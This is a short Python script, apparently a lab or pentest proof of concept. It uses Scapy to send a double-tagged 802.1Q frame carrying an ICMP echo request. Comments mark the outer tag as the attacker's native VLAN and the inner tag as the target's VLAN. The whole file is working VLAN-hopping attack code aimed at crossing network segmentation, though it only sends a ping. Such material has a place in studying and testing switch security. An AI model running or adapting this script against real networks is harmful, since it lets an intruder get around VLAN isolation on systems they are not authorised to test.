from scapy.all import *
import sys

def main():
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <outer_vlan_id> <inner_vlan_id> <destination_ip>")
        sys.exit(1)

    outer_vlan = int(sys.argv[1])  # attacker's VLAN (native VLAN, e.g. 1)
    inner_vlan = int(sys.argv[2])  # target's VLAN (e.g. 20)
    dst_ip     = sys.argv[3]       # target IP (e.g. 192.168.130.100)

    iface   = "eth0"
    src_ip  = get_if_addr(iface)
    src_mac = get_if_hwaddr(iface)

    # Double-tagged frame:
    # Outer 802.1Q tag: native VLAN (will be stripped by the trunk switch)
    # Inner 802.1Q tag: target VLAN (remains after outer is stripped)
    pkt = (
        Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") /
        Dot1Q(vlan=outer_vlan) /
        Dot1Q(vlan=inner_vlan) /
        IP(src=src_ip, dst=dst_ip) /
        ICMP()
    )

    print(f"Sending double-tagged ICMP echo request:")
    print(f"  Outer VLAN: {outer_vlan}")
    print(f"  Inner VLAN: {inner_vlan}")
    print(f"  {src_ip} -> {dst_ip}")
    pkt.show()

    sendp(pkt, iface=iface, verbose=True)

if __name__ == "__main__":
    main()
